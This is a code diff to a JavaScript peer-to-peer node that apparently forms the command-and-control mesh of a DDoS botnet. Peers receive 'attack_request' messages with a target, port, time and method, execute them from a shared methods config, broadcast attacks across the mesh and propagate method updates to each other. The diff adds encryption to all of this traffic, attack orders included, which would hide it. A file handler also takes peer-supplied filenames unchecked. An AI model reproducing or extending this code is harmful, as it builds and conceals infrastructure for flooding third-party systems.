@@ -5,6 +5,7 @@ import fs from 'fs';
 import path from 'path';
 import { fileURLToPath } from 'url';
 import { normalizeMethodsToLocalPaths } from './methodSync.js';
+import EncryptionManager from './encryption.js';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -22,7 +23,6 @@ class P2PHybridNode extends EventEmitter {
     this.nodeMode = 'DIRECT';
     
     this.peers = new Map();
-    this.pendingConnections = new Map();
     this.connectionLocks = new Map();
     
     this.knownPeers = new Map();
@@ -36,7 +36,6 @@ class P2PHybridNode extends EventEmitter {
     this.methodsVersionHash = null;
     this.methodsLastUpdate = Date.now();
     this.methodUpdatePropagationLock = new Map();
-    this.methodsPropagationChain = new Map();
     
     this.fileCache = new Map();
     
@@ -65,7 +64,11 @@ class P2PHybridNode extends EventEmitter {
       referralsReceived: 0,
       connectionsViaReferral: 0,
       requestHandlersCleaned: 0,
-      memoryLeaksPrevent: 0
+      memoryLeaksPrevent: 0,
+      encryptedMessagesSent: 0,
+      encryptedMessagesReceived: 0,
+      plainMessagesSent: 0,
+      plainMessagesReceived: 0
     };
     
     this.p2pConfig = {
@@ -92,7 +95,27 @@ class P2PHybridNode extends EventEmitter {
       propagationCooldown: 10000
     };
     
+    // Initialize encryption manager jika enabled
     this.encryptionManager = null;
+    if (config.ENCRYPTION?.ENABLED) {
+      try {
+        this.encryptionManager = new EncryptionManager({
+          ...config,
+          ENCRYPTION: {
+            ...config.ENCRYPTION,
+            NODE_ID: config.NODE.ID
+          }
+        });
+        console.log('[P2P] Encryption manager initialized', {
+          enabled: true,
+          algorithm: config.ENCRYPTION.ALGORITHM,
+          version: config.ENCRYPTION.VERSION
+        });
+      } catch (error) {
+        console.error('[P2P] Failed to initialize encryption:', error.message);
+        this.encryptionManager = null;
+      }
+    }
     
     this.discoveryInterval = null;
     this.peerCleanupInterval = null;
@@ -109,18 +132,117 @@ class P2PHybridNode extends EventEmitter {
     this.masterReachable = false;
     this.lastMasterCheck = null;
     
-    console.log('[P2P] P2P Hybrid Node initialized (UPGRADED v4.0)', {
+    console.log('[P2P] P2P Hybrid Node initialized (v4.1 with Encryption)', {
       nodeId: this.nodeId,
       enabled: this.p2pConfig.enabled,
       maxPeers: this.p2pConfig.maxPeers,
-      maxReferrals: this.p2pConfig.maxReferralsToSend,
-      preferP2PSync: this.p2pConfig.preferP2PSync
+      encryption: !!this.encryptionManager
     });
   }
   
   setEncryptionManager(manager) {
-    this.encryptionManager = manager;
-    console.log('[P2P] Encryption manager set');
+    if (manager && manager instanceof EncryptionManager) {
+      this.encryptionManager = manager;
+      console.log('[P2P] Encryption manager updated via setEncryptionManager()', {
+        hasEncrypt: typeof manager.createSecureMessage === 'function',
+        hasDecrypt: typeof manager.processSecureMessage === 'function'
+      });
+    } else {
+      console.warn('[P2P] Invalid encryption manager provided');
+    }
+  }
+  
+  isEncryptionEnabled() {
+    return !!(
+      this.encryptionManager && 
+      this.config.ENCRYPTION?.ENABLED &&
+      typeof this.encryptionManager.createSecureMessage === 'function' &&
+      typeof this.encryptionManager.processSecureMessage === 'function'
+    );
+  }
+  
+  // HELPER: Encrypt message before sending
+  encryptMessage(message, messageType = 'p2p_message') {
+    if (!this.isEncryptionEnabled()) {
+      this.stats.plainMessagesSent++;
+      return {
+        encrypted: false,
+        data: message
+      };
+    }
+    
+    try {
+      const encrypted = this.encryptionManager.createSecureMessage(message, messageType);
+      this.stats.encryptedMessagesSent++;
+      return {
+        encrypted: true,
+        data: encrypted
+      };
+    } catch (error) {
+      console.error('[P2P-ENCRYPT] Failed to encrypt message:', error.message);
+      this.stats.plainMessagesSent++;
+      return {
+        encrypted: false,
+        data: message
+      };
+    }
+  }
+  
+  // HELPER: Decrypt message after receiving
+  decryptMessage(data) {
+    // Check if message is encrypted
+    if (!data || typeof data !== 'object') {
+      this.stats.plainMessagesReceived++;
+      return {
+        success: true,
+        encrypted: false,
+        data: data
+      };
+    }
+    
+    if (data.envelope === 'secure' && this.isEncryptionEnabled()) {
+      try {
+        const result = this.encryptionManager.processSecureMessage(data);
+        if (result.success) {
+          this.stats.encryptedMessagesReceived++;
+          return {
+            success: true,
+            encrypted: true,
+            data: result.data,
+            metadata: result.metadata
+          };
+        } else {
+          console.error('[P2P-DECRYPT] Failed to decrypt:', result.error);
+          return {
+            success: false,
+            encrypted: true,
+            error: result.error
+          };
+        }
+      } catch (error) {
+        console.error('[P2P-DECRYPT] Decryption error:', error.message);
+        return {
+          success: false,
+          encrypted: true,
+          error: error.message
+        };
+      }
+    } else if (data.envelope === 'plain') {
+      this.stats.plainMessagesReceived++;
+      return {
+        success: true,
+        encrypted: false,
+        data: data.payload
+      };
+    }
+    
+    // Unencrypted message (backward compatibility)
+    this.stats.plainMessagesReceived++;
+    return {
+      success: true,
+      encrypted: false,
+      data: data
+    };
   }
   
   setNodeMode(mode) {
@@ -245,7 +367,7 @@ class P2PHybridNode extends EventEmitter {
       });
       
       this.isServerReady = true;
-      console.log(`[P2P-SERVER] P2P server started on port ${this.nodePort}`);
+      console.log(`[P2P-SERVER] P2P server started on port ${this.nodePort} with encryption: ${this.isEncryptionEnabled()}`);
       
       this.updateMethodsVersion();
       
@@ -343,6 +465,7 @@ class P2PHybridNode extends EventEmitter {
     const remoteMode = request.headers['x-node-mode'] || 'DIRECT';
     const remotePortHeader = request.headers['x-node-port'];
     const remotePort = remotePortHeader ? parseInt(remotePortHeader, 10) : null;
+    const remoteEncryption = request.headers['x-encryption'] === 'enabled';
 
     const remoteIp = typeof remoteIpRaw === 'string'
       ? remoteIpRaw.replace('::ffff:', '')
@@ -352,7 +475,8 @@ class P2PHybridNode extends EventEmitter {
       remoteNodeId,
       remoteIp,
       remotePort,
-      remoteMode
+      remoteMode,
+      encryption: remoteEncryption
     });
   
     if (!remoteNodeId) {
@@ -389,7 +513,8 @@ class P2PHybridNode extends EventEmitter {
         capabilities: null,
         methodsVersion: null,
         methodsCount: 0,
-        lastUpdate: Date.now()
+        lastUpdate: Date.now(),
+        supportsEncryption: remoteEncryption
       });
       console.log(`[P2P-SERVER] Added ${remoteNodeId} (${remoteIp}:${remotePort}) to known peers (${this.knownPeers.size} total)`);
     }
@@ -401,7 +526,7 @@ class P2PHybridNode extends EventEmitter {
       this.stats.referralsSent++;
       
       try {
-        ws.send(JSON.stringify({
+        const rejectMessage = {
           type: 'connection_rejected',
           reason: 'max_peers_reached',
           maxPeers: this.p2pConfig.maxPeers,
@@ -414,9 +539,13 @@ class P2PHybridNode extends EventEmitter {
             port: this.nodePort
           },
           message: `This node is full (${this.peers.size}/${this.p2pConfig.maxPeers}). Try connecting to ${referrals.length} suggested peer(s).`
-        }));
+        };
         
-        console.log(`[P2P-SERVER] Sent ${referrals.length} referrals to ${remoteNodeId}`);
+        // Encrypt rejection message if both peers support encryption
+        const encrypted = this.encryptMessage(rejectMessage, 'connection_rejected');
+        ws.send(JSON.stringify(encrypted.data));
+        
+        console.log(`[P2P-SERVER] Sent ${referrals.length} referrals to ${remoteNodeId} (encrypted: ${encrypted.encrypted})`);
       } catch (error) {
         console.error('[P2P-SERVER] Failed to send referrals:', error.message);
       }
@@ -453,7 +582,10 @@ class P2PHybridNode extends EventEmitter {
       connectedAt: now,
       capabilities: null,
       methodsVersion: null,
-      methodsCount: 0
+      methodsCount: 0,
+      supportsEncryption: remoteEncryption,
+      encryptedMessages: 0,
+      plainMessages: 0
     };
   
     this.peers.set(remoteNodeId, peerInfo);
@@ -461,7 +593,8 @@ class P2PHybridNode extends EventEmitter {
     this.stats.directConnections++;
     this.stats.connectionSuccesses++;
   
-    this.sendToPeer(remoteNodeId, {
+    // Send welcome message (encrypted if both support encryption)
+    const welcomeMessage = {
       type: 'welcome',
       nodeId: this.nodeId,
       ip: this.nodeIp,
@@ -469,18 +602,70 @@ class P2PHybridNode extends EventEmitter {
       mode: this.nodeMode,
       timestamp: Date.now(),
       capabilities: {
-        encryption: !!this.encryptionManager,
+        encryption: this.isEncryptionEnabled(),
         methods: Object.keys(this.methodsConfig),
         methodsVersion: this.methodsVersionHash,
         methodsCount: Object.keys(this.methodsConfig).length,
         relay: this.p2pConfig.relayFallback && this.masterReachable,
         fileSharing: true,
         referrals: true,
-        version: '4.0'
+        version: '4.1'
       }
-    });
+    };
+    
+    const encrypted = this.encryptMessage(welcomeMessage, 'welcome');
+    this.sendToPeer(remoteNodeId, encrypted.data);
   
     ws.on('message', (data) => {
+      try {
+        const rawMessage = JSON.parse(data.toString());
+        const decrypted = this.decryptMessage(rawMessage);
+        if (decrypted.success && decrypted.data?.type === 'welcome') {
+          // Inbound peer sent us their capabilities — update peerInfo immediately
+          const msg = decrypted.data;
+          const peer = this.peers.get(remoteNodeId);
+          if (peer) {
+            peer.capabilities = msg.capabilities || peer.capabilities;
+            peer.mode = msg.mode || peer.mode;
+            if (msg.capabilities) {
+              peer.supportsEncryption = msg.capabilities.encryption ?? peer.supportsEncryption;
+              peer.methodsVersion = msg.capabilities.methodsVersion || peer.methodsVersion;
+              peer.methodsCount = msg.capabilities.methodsCount || peer.methodsCount || 0;
+            }
+            if (msg.ip) peer.ip = msg.ip;
+            if (msg.port) peer.port = this.normalizePort(msg.port);
+
+            // Sync knownPeers too
+            const kp = this.knownPeers.get(remoteNodeId) || {};
+            this.knownPeers.set(remoteNodeId, {
+              ...kp,
+              nodeId: remoteNodeId,
+              ip: msg.ip || peer.ip,
+              port: this.normalizePort(msg.port || peer.port),
+              mode: msg.mode || peer.mode || 'DIRECT',
+              reachable: true,
+              capabilities: msg.capabilities || kp.capabilities,
+              methodsVersion: msg.capabilities?.methodsVersion || kp.methodsVersion,
+              methodsCount: msg.capabilities?.methodsCount || kp.methodsCount || 0,
+              lastUpdate: Date.now(),
+              supportsEncryption: msg.capabilities?.encryption ?? kp.supportsEncryption ?? false
+            });
+
+            console.log(
+              `[P2P-SERVER] Updated REVERSE peer ${remoteNodeId} capabilities from inbound welcome:`,
+              { methodsCount: peer.methodsCount, supportsEncryption: peer.supportsEncryption }
+            );
+
+            if (this.p2pConfig.preferP2PSync && peer.methodsVersion &&
+                peer.methodsVersion !== this.methodsVersionHash) {
+              setTimeout(() => this.requestMethodsVersionFromPeer(remoteNodeId), 1000);
+            }
+
+            this.emit('peer_info', { nodeId: remoteNodeId, capabilities: msg.capabilities, mode: msg.mode });
+          }
+          return; // already processed
+        }
+      } catch (_) { /* fall through to normal handler */ }
       this.handlePeerMessage(remoteNodeId, data);
     });
   
@@ -504,14 +689,15 @@ class P2PHybridNode extends EventEmitter {
       ip: remoteIp,
       port: remotePort,
       mode: remoteMode,
-      direct: true
+      direct: true,
+      encrypted: encrypted.encrypted
     });
   
     this.processQueuedMessages(remoteNodeId);
   
     console.log(
       `[P2P] Peer ${remoteNodeId} (${remoteMode}) at ${remoteIp}:${remotePort} connected successfully (` +
-      `${this.peers.size}/${this.p2pConfig.maxPeers})`
+      `${this.peers.size}/${this.p2pConfig.maxPeers}, encryption: ${encrypted.encrypted})`
     );
   }
   
@@ -720,7 +906,8 @@ class P2PHybridNode extends EventEmitter {
           'X-Node-ID': this.nodeId,
           'X-Node-IP': this.nodeIp || 'unknown',
           'X-Node-Port': this.nodePort.toString(),
-          'X-Node-Mode': this.nodeMode
+          'X-Node-Mode': this.nodeMode,
+          'X-Encryption': this.isEncryptionEnabled() ? 'enabled' : 'disabled'
         },
         handshakeTimeout: this.p2pConfig.connectionTimeout
       });
@@ -794,13 +981,45 @@ class P2PHybridNode extends EventEmitter {
             connectedAt: now,
             capabilities: peerInfo.capabilities || null,
             methodsVersion: peerInfo.methodsVersion || null,
-            methodsCount: peerInfo.methodsCount || 0
+            methodsCount: peerInfo.methodsCount || 0,
+            supportsEncryption: false,
+            encryptedMessages: 0,
+            plainMessages: 0
           };
           
           this.peers.set(nodeId, peer);
           this.connectionLocks.delete(nodeId);
           this.stats.directConnections++;
           this.stats.connectionSuccesses++;
+          
+          // Send our own welcome/capabilities to the server-side peer so it can
+          // populate its peerInfo.capabilities (fixes null capabilities on REVERSE mode)
+          const selfWelcome = {
+            type: 'welcome',
+            nodeId: this.nodeId,
+            ip: this.nodeIp,
+            port: this.nodePort,
+            mode: this.nodeMode,
+            timestamp: now,
+            capabilities: {
+              encryption: this.isEncryptionEnabled(),
+              methods: Object.keys(this.methodsConfig),
+              methodsVersion: this.methodsVersionHash,
+              methodsCount: Object.keys(this.methodsConfig).length,
+              relay: this.p2pConfig.relayFallback && this.masterReachable,
+              fileSharing: true,
+              referrals: true,
+              version: '4.1'
+            }
+          };
+          const selfWelcomeEncrypted = this.encryptMessage(selfWelcome, 'welcome');
+          try {
+            ws.send(JSON.stringify(selfWelcomeEncrypted.data));
+            peer.messagesSent++;
+            this.stats.messagesSent++;
+          } catch (e) {
+            console.error(`[P2P] Failed to send self-welcome to ${nodeId}:`, e.message);
+          }
           
           ws.on('message', (data) => this.handlePeerMessage(nodeId, data));
           
@@ -859,17 +1078,31 @@ class P2PHybridNode extends EventEmitter {
   
   handlePeerMessage(nodeId, data) {
     try {
-      const message = JSON.parse(data.toString());
+      const rawMessage = JSON.parse(data.toString());
+      const decrypted = this.decryptMessage(rawMessage);
+      
+      if (!decrypted.success) {
+        console.error(`[P2P] Failed to decrypt message from ${nodeId}:`, decrypted.error);
+        return;
+      }
+      
+      const message = decrypted.data;
       
       const peer = this.peers.get(nodeId);
       if (peer) {
         peer.lastSeen = Date.now();
         peer.messagesReceived++;
+        
+        if (decrypted.encrypted) {
+          peer.encryptedMessages++;
+        } else {
+          peer.plainMessages++;
+        }
       }
       
       this.stats.messagesReceived++;
       
-      console.log(`[P2P] Message from ${nodeId}: ${message.type}`);
+      console.log(`[P2P] Message from ${nodeId}: ${message.type} (encrypted: ${decrypted.encrypted})`);
       
       switch (message.type) {
         case 'connection_rejected':
@@ -878,20 +1111,23 @@ class P2PHybridNode extends EventEmitter {
         case 'welcome':
           this.handleWelcomeMessage(nodeId, message);
           break;
-        case 'ping':
-          this.sendToPeer(nodeId, { type: 'pong', timestamp: Date.now() });
+        case 'ping': {
+          const pongMessage = { type: 'pong', timestamp: Date.now() };
+          const encrypted = this.encryptMessage(pongMessage, 'pong');
+          this.sendToPeer(nodeId, encrypted.data);
           break;
+        }
         case 'pong':
           if (peer) peer.lastHeartbeat = Date.now();
           break;
         case 'attack_request':
-          this.handleAttackRequest(nodeId, message);
+          this.handleAttackRequest(nodeId, message, decrypted.encrypted);
           break;
         case 'attack_response':
           this.emit('attack_response', { nodeId, ...message });
           break;
         case 'status_request':
-          this.handleStatusRequest(nodeId, message);
+          this.handleStatusRequest(nodeId, message, decrypted.encrypted);
           break;
         case 'status_response':
           this.emit('status_response', { nodeId, ...message });
@@ -900,19 +1136,19 @@ class P2PHybridNode extends EventEmitter {
           this.handlePeerListUpdate(message);
           break;
         case 'relay_request':
-          this.handleRelayRequest(nodeId, message);
+          this.handleRelayRequest(nodeId, message, decrypted.encrypted);
           break;
         case 'relay_response':
           this.handleRelayResponse(nodeId, message);
           break;
         case 'methods_version_query':
-          this.handleMethodsVersionQuery(nodeId, message);
+          this.handleMethodsVersionQuery(nodeId, message, decrypted.encrypted);
           break;
         case 'methods_version_response':
           this.handleMethodsVersionResponse(nodeId, message);
           break;
         case 'methods_request':
-          this.handleMethodsRequest(nodeId, message);
+          this.handleMethodsRequest(nodeId, message, decrypted.encrypted);
           break;
         case 'methods_response':
           this.handleMethodsResponse(nodeId, message);
@@ -924,7 +1160,7 @@ class P2PHybridNode extends EventEmitter {
           this.handleMethodsUpdateNotification(nodeId, message);
           break;
         case 'file_request':
-          this.handleFileRequest(nodeId, message);
+          this.handleFileRequest(nodeId, message, decrypted.encrypted);
           break;
         case 'file_response':
           this.handleFileResponse(nodeId, message);
@@ -947,6 +1183,11 @@ class P2PHybridNode extends EventEmitter {
       peer.capabilities = message.capabilities;
       peer.mode = message.mode || 'DIRECT';
       
+      if (message.capabilities && message.capabilities.encryption !== undefined) {
+        peer.supportsEncryption = message.capabilities.encryption;
+        console.log(`[P2P] Peer ${nodeId} encryption support: ${peer.supportsEncryption}`);
+      }
+      
       if (message.ip) peer.ip = message.ip;
       if (message.port) peer.port = this.normalizePort(message.port);
       
@@ -965,7 +1206,8 @@ class P2PHybridNode extends EventEmitter {
         capabilities: message.capabilities,
         methodsVersion: message.capabilities?.methodsVersion,
         methodsCount: message.capabilities?.methodsCount || 0,
-        lastUpdate: now
+        lastUpdate: now,
+        supportsEncryption: message.capabilities?.encryption || false
       });
       
       if (this.p2pConfig.preferP2PSync && peer.methodsVersion && 
@@ -984,24 +1226,27 @@ class P2PHybridNode extends EventEmitter {
     });
   }
   
-  async handleAttackRequest(nodeId, message) {
+  async handleAttackRequest(nodeId, message, wasEncrypted) {
     const { requestId, target, time, port, methods } = message;
     
     console.log(`[P2P] Attack request from ${nodeId}:`, {
       target,
       time,
-      methods
+      methods,
+      encrypted: wasEncrypted
     });
     
     try {
       const methodCfg = this.methodsConfig[methods];
       if (!methodCfg) {
-        this.sendToPeer(nodeId, {
+        const response = {
           type: 'attack_response',
           requestId,
           success: false,
           error: 'INVALID_METHOD'
-        });
+        };
+        const encrypted = this.encryptMessage(response, 'attack_response');
+        this.sendToPeer(nodeId, encrypted.data);
         return;
       }
       
@@ -1014,7 +1259,7 @@ class P2PHybridNode extends EventEmitter {
         expectedDuration: time
       });
       
-      this.sendToPeer(nodeId, {
+      const response = {
         type: 'attack_response',
         requestId,
         success: true,
@@ -1024,21 +1269,25 @@ class P2PHybridNode extends EventEmitter {
         time,
         port,
         methods
-      });
+      };
+      const encrypted = this.encryptMessage(response, 'attack_response');
+      this.sendToPeer(nodeId, encrypted.data);
       
       console.log(`[P2P] Attack executed for ${nodeId}`);
       
     } catch (error) {
-      this.sendToPeer(nodeId, {
+      const response = {
         type: 'attack_response',
         requestId,
         success: false,
         error: error.message
-      });
+      };
+      const encrypted = this.encryptMessage(response, 'attack_response');
+      this.sendToPeer(nodeId, encrypted.data);
     }
   }
   
-  async handleStatusRequest(nodeId, message) {
+  async handleStatusRequest(nodeId, message, wasEncrypted) {
     const { requestId } = message;
     
     try {
@@ -1054,56 +1303,67 @@ class P2PHybridNode extends EventEmitter {
         methodsCount: methods.length,
         peers: this.peers.size,
         uptime: process.uptime(),
-        timestamp: Date.now()
+        timestamp: Date.now(),
+        encryption: this.isEncryptionEnabled()
       };
       
-      this.sendToPeer(nodeId, {
+      const response = {
         type: 'status_response',
         requestId,
         status
-      });
+      };
+      const encrypted = this.encryptMessage(response, 'status_response');
+      this.sendToPeer(nodeId, encrypted.data);
       
     } catch (error) {
-      this.sendToPeer(nodeId, {
+      const response = {
         type: 'status_response',
         requestId,
         error: error.message
-      });
+      };
+      const encrypted = this.encryptMessage(response, 'status_response');
+      this.sendToPeer(nodeId, encrypted.data);
     }
   }
   
-  async handleRelayRequest(nodeId, message) {
+  async handleRelayRequest(nodeId, message, wasEncrypted) {
     const { relayId, targetNodeId, payload } = message;
     
     console.log(`[P2P-RELAY] Relay request from ${nodeId} to ${targetNodeId}`);
     
     if (this.peers.has(targetNodeId)) {
-      const success = this.sendToPeer(targetNodeId, {
+      const relayedMessage = {
         type: 'relayed_message',
         sourceNodeId: nodeId,
         relayId,
         payload
-      });
+      };
+      const encrypted = this.encryptMessage(relayedMessage, 'relayed_message');
+      const success = this.sendToPeer(targetNodeId, encrypted.data);
       
-      this.sendToPeer(nodeId, {
+      const response = {
         type: 'relay_response',
         relayId,
         success,
         targetNodeId
-      });
+      };
+      const encryptedResponse = this.encryptMessage(response, 'relay_response');
+      this.sendToPeer(nodeId, encryptedResponse.data);
       
       if (success) {
         this.stats.messagesRelayed++;
       }
       
     } else {
-      this.sendToPeer(nodeId, {
+      const response = {
         type: 'relay_response',
         relayId,
         success: false,
         error: 'Target not connected',
         targetNodeId
-      });
+      };
+      const encrypted = this.encryptMessage(response, 'relay_response');
+      this.sendToPeer(nodeId, encrypted.data);
     }
   }
   
@@ -1156,11 +1416,11 @@ class P2PHybridNode extends EventEmitter {
     }
   }
   
-  handleMethodsVersionQuery(nodeId, message) {
+  handleMethodsVersionQuery(nodeId, message, wasEncrypted) {
     const { requestId } = message;
     const methodsCount = Object.keys(this.methodsConfig).length;
     
-    this.sendToPeer(nodeId, {
+    const response = {
       type: 'methods_version_response',
       requestId,
       nodeId: this.nodeId,
@@ -1168,7 +1428,9 @@ class P2PHybridNode extends EventEmitter {
       methodsCount,
       lastUpdate: this.methodsLastUpdate,
       timestamp: Date.now()
-    });
+    };
+    const encrypted = this.encryptMessage(response, 'methods_version_response');
+    this.sendToPeer(nodeId, encrypted.data);
   }
   
   handleMethodsVersionResponse(nodeId, message) {
@@ -1202,13 +1464,13 @@ class P2PHybridNode extends EventEmitter {
     });
   }
   
-  handleMethodsRequest(nodeId, message) {
+  handleMethodsRequest(nodeId, message, wasEncrypted) {
     const { requestId } = message;
     const methodsCount = Object.keys(this.methodsConfig).length;
     
     console.log(`[P2P-METHODS] Peer ${nodeId} requested full methods config`);
     
-    this.sendToPeer(nodeId, {
+    const response = {
       type: 'methods_response',
       requestId,
       nodeId: this.nodeId,
@@ -1216,7 +1478,9 @@ class P2PHybridNode extends EventEmitter {
       methodsVersion: this.methodsVersionHash,
       methodsCount,
       timestamp: Date.now()
-    });
+    };
+    const encrypted = this.encryptMessage(response, 'methods_response');
+    this.sendToPeer(nodeId, encrypted.data);
     
     this.stats.filesShared++;
   }
@@ -1391,7 +1655,7 @@ class P2PHybridNode extends EventEmitter {
     }
   }
   
-  handleFileRequest(nodeId, message) {
+  handleFileRequest(nodeId, message, wasEncrypted) {
     const { requestId, filename } = message;
     
     console.log(`[P2P-FILE] Peer ${nodeId} requested file: ${filename}`);
@@ -1400,13 +1664,15 @@ class P2PHybridNode extends EventEmitter {
     const filePath = path.join(dataDir, filename);
     
     if (!fs.existsSync(filePath)) {
-      this.sendToPeer(nodeId, {
+      const response = {
         type: 'file_response',
         requestId,
         filename,
         success: false,
         error: 'File not found'
-      });
+      };
+      const encrypted = this.encryptMessage(response, 'file_response');
+      this.sendToPeer(nodeId, encrypted.data);
       return;
     }
 
@@ -1414,26 +1680,30 @@ class P2PHybridNode extends EventEmitter {
       const fileData = fs.readFileSync(filePath);
       const base64Data = fileData.toString('base64');
       
-      this.sendToPeer(nodeId, {
+      const response = {
         type: 'file_response',
         requestId,
         filename,
         data: base64Data,
         size: fileData.length,
         success: true
-      });
+      };
+      const encrypted = this.encryptMessage(response, 'file_response');
+      this.sendToPeer(nodeId, encrypted.data);
       
       this.stats.filesShared++;
-      console.log(`[P2P-FILE] Sent file ${filename} to ${nodeId}`);
+      console.log(`[P2P-FILE] Sent file ${filename} to ${nodeId} (encrypted: ${encrypted.encrypted})`);
       
     } catch (error) {
-      this.sendToPeer(nodeId, {
+      const response = {
         type: 'file_response',
         requestId,
         filename,
         success: false,
         error: error.message
-      });
+      };
+      const encrypted = this.encryptMessage(response, 'file_response');
+      this.sendToPeer(nodeId, encrypted.data);
     }
   }
   
@@ -1574,7 +1844,6 @@ class P2PHybridNode extends EventEmitter {
     return { success: false, error: 'No relay peer available' };
   }
 
-  // Helper untuk mengurangi duplikasi pola request/response berbasis event
   _requestWithHandler({
     nodeId,
     requestId,
@@ -1616,7 +1885,8 @@ class P2PHybridNode extends EventEmitter {
         resolve({ success: false, error: 'Timeout' });
       }, timeoutMs);
       
-      const sent = this.sendToPeer(nodeId, message);
+      const encrypted = this.encryptMessage(message, message.type);
+      const sent = this.sendToPeer(nodeId, encrypted.data);
       if (!sent) {
         cleanup();
         resolve({ success: false, error: 'Failed to send request' });
@@ -1660,11 +1930,12 @@ class P2PHybridNode extends EventEmitter {
         urgent: true
       };
       
-      const sent = this.sendToPeer(nodeId, notification);
+      const encrypted = this.encryptMessage(notification, 'methods_update_notification');
+      const sent = this.sendToPeer(nodeId, encrypted.data);
       
       if (sent) {
         notified++;
-        console.log(`[P2P-METHODS] ✓ Notified ${nodeId} immediately (chain: ${newChain.length} hops)`);
+        console.log(`[P2P-METHODS] ✓ Notified ${nodeId} immediately (chain: ${newChain.length} hops, encrypted: ${encrypted.encrypted})`);
         notificationPromises.push(
           this.sendMethodsConfigToPeer(nodeId, version, newChain)
         );
@@ -1695,11 +1966,12 @@ class P2PHybridNode extends EventEmitter {
         timestamp: Date.now()
       };
       
-      const sent = this.sendToPeer(nodeId, message);
+      const encrypted = this.encryptMessage(message, 'methods_push');
+      const sent = this.sendToPeer(nodeId, encrypted.data);
       
       if (sent) {
         console.log(
-          `[P2P-METHODS] ✓ Pushed full config to ${nodeId} (chain: ${propagationChain.length} hops)`
+          `[P2P-METHODS] ✓ Pushed full config to ${nodeId} (chain: ${propagationChain.length} hops, encrypted: ${encrypted.encrypted})`
         );
         this.stats.filesShared++;
       }
@@ -1873,10 +2145,14 @@ class P2PHybridNode extends EventEmitter {
   broadcastToPeers(message, excludeNodeId = null) {
     let sent = 0;
     
+    const encrypted = this.encryptMessage(message, message.type || 'broadcast');
+    
     for (const [nodeId] of this.peers) {
       if (excludeNodeId && nodeId === excludeNodeId) continue;
-      if (this.sendToPeer(nodeId, message)) sent++;
+      if (this.sendToPeer(nodeId, encrypted.data)) sent++;
     }
+    
+    console.log(`[P2P] Broadcast to ${sent} peer(s) (encrypted: ${encrypted.encrypted})`);
     
     return sent;
   }
@@ -1914,7 +2190,7 @@ class P2PHybridNode extends EventEmitter {
     }
 
     console.log(
-      `[P2P-ATTACK-BROADCAST] Broadcasting attack to ${peersToUse.length} peer(s)`
+      `[P2P-ATTACK-BROADCAST] Broadcasting attack to ${peersToUse.length} peer(s) (encrypted: ${this.isEncryptionEnabled()})`
     );
 
     const results = [];
@@ -2287,6 +2563,17 @@ class P2PHybridNode extends EventEmitter {
       activeHandlers: this.requestHandlers.size
     };
     
+    const encryptionStats = {
+      encryptedMessagesSent: this.stats.encryptedMessagesSent,
+      encryptedMessagesReceived: this.stats.encryptedMessagesReceived,
+      plainMessagesSent: this.stats.plainMessagesSent,
+      plainMessagesReceived: this.stats.plainMessagesReceived,
+      totalMessages: this.stats.messagesSent + this.stats.messagesReceived,
+      encryptionRate: this.stats.messagesSent > 0 
+        ? ((this.stats.encryptedMessagesSent / this.stats.messagesSent) * 100).toFixed(2) + '%'
+        : 'N/A'
+    };
+    
     return {
       enabled: this.p2pConfig.enabled,
       nodeId: this.nodeId,
@@ -2295,6 +2582,7 @@ class P2PHybridNode extends EventEmitter {
       nodeMode: this.nodeMode,
       serverReady: this.isServerReady,
       masterReachable: this.masterReachable,
+      encryption: this.isEncryptionEnabled(),
       methodsVersion: this.methodsVersionHash?.substring(0, 8),
       methodsCount,
       preferP2PSync: this.p2pConfig.preferP2PSync,
@@ -2314,6 +2602,7 @@ class P2PHybridNode extends EventEmitter {
         ...this.stats,
         referralStats,
         cleanupStats,
+        encryptionStats,
         successRate: this.stats.connectionAttempts > 0 
           ? ((this.stats.connectionSuccesses / this.stats.connectionAttempts) * 100).toFixed(2) + '%'
           : 'N/A'
@@ -2341,7 +2630,10 @@ class P2PHybridNode extends EventEmitter {
         uptime: Date.now() - peer.connectedAt,
         capabilities: peer.capabilities,
         methodsVersion: peer.methodsVersion?.substring(0, 8),
-        methodsCount: peer.methodsCount
+        methodsCount: peer.methodsCount,
+        supportsEncryption: peer.supportsEncryption,
+        encryptedMessages: peer.encryptedMessages,
+        plainMessages: peer.plainMessages
       })),
       knownPeers: Array.from(this.knownPeers.values()).map(peer => ({
         nodeId: peer.nodeId,
@@ -2355,7 +2647,8 @@ class P2PHybridNode extends EventEmitter {
         methodsVersion: peer.methodsVersion?.substring(0, 8),
         methodsCount: peer.methodsCount,
         fromReferral: peer.fromReferral || false,
-        referredBy: peer.referredBy || null
+        referredBy: peer.referredBy || null,
+        supportsEncryption: peer.supportsEncryption || false
       }))
     };
   }
@@ -2407,13 +2700,16 @@ class P2PHybridNode extends EventEmitter {
     this.requestHandlers.clear();
     this.requestHandlerTimestamps.clear();
     
+    const goodbyeMessage = {
+      type: 'goodbye',
+      nodeId: this.nodeId,
+      timestamp: Date.now()
+    };
+    
     for (const [nodeId, peer] of this.peers) {
       try {
-        this.sendToPeer(nodeId, {
-          type: 'goodbye',
-          nodeId: this.nodeId,
-          timestamp: Date.now()
-        });
+        const encrypted = this.encryptMessage(goodbyeMessage, 'goodbye');
+        this.sendToPeer(nodeId, encrypted.data);
         
         setTimeout(() => {
           try { peer.ws.close(); } catch {}
@@ -2431,13 +2727,14 @@ class P2PHybridNode extends EventEmitter {
       this.receivedReferrals.clear();
       this.referralTimestamps.clear();
       this.methodUpdatePropagationLock.clear();
-      this.methodsPropagationChain.clear();
     }, 1000);
     
     this.cleanup();
     this.removeAllListeners();
     
     console.log('[P2P] P2P node shutdown complete');
+    console.log(`[P2P] Encryption stats - Sent: ${this.stats.encryptedMessagesSent} encrypted, ${this.stats.plainMessagesSent} plain`);
+    console.log(`[P2P] Encryption stats - Received: ${this.stats.encryptedMessagesReceived} encrypted, ${this.stats.plainMessagesReceived} plain`);
   }
 }
 
